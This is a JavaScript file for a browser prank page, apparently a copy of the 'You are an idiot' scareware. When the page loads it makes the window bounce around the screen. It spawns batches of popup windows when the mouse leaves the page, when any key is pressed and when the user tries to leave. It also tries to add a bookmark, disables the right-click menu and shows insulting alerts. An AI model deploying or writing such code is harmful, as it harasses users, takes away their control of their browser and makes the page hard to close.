var delay = 0;
var s;
var v;
let soundLoop;

function musicPlay() {
  v = createVideo("youare.mp4")
  let intervalInSeconds = 5.25;
  soundLoop = new p5.SoundLoop(onSoundLoop, intervalInSeconds);
  
  delay += 1/60;
  s.setVolume(0.5)
  if (delay >= 4.75) {
    proCreate();
    delay = -10.75;
  }
}

function onSoundLoop() {
  s.play();
  soundLoop.start();
}

function bookmark() {
	if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
		var url = "lol.html";
		var title = "Idiot!";
		
		window.external.AddFavorite(url, title);
	}
}

var xOff = 5;
var yOff = 5;
var xPos = 400;
var yPos = -100;
var flagRun = 1;

function changeTitle(title) {
	document.title = title;
}

function openWindow(url) {
	aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
}

function proCreate() {	
	for (var i = 0; i < 5; i++) {
		openWindow('lol.html');
	}
}

function newXlt() {
	xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
	window.focus();
}

function newXrt() {
	xOff = Math.ceil(7 * Math.random())  * 5 - 10;
	window.focus();
}

function newYup() {
	yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
	window.focus();
}

function newYdn() {
	yOff = Math.ceil( 7 * Math.random()) * 5 - 10;
	window.focus();
}

function fOff(){
	flagRun = 0;
}

function playBall() {
    xPos += xOff;
    yPos += yOff;
    
	if (xPos > screen.width - 357) newXlt();    
	if (xPos < 0) newXrt();
    
	if (yPos > screen.height - 330) newYup(); 		
	if (yPos < 0) newYdn();
    
	if (flagRun == 1) {
        window.moveTo(xPos, yPos);
        setTimeout('playBall()', 1);
    }
}

/* [Oct 2021] Better code. */
window.onload = function () {
	flagRun = 1;
	
	playBall();
	bookmark();
	
	return true;
}

window.onmouseout = function () {
	proCreate();

	return null;
};

window.oncontextmenu = function() {
	
	return false;
}

window.onkeydown = function() {	
	var keyCode = event.keyCode;
	
	if ((keyCode == 8 || 16 || 17 || 27 || 18 || 91 || 87 || 81)) {	
      proCreate();
	  alert("You are an idiot!"); 
	}
	
	return null;
}

window.onbeforeunload = function() {
  
  openWindow("lol.html")
  
    return "Are you an idiot?";
};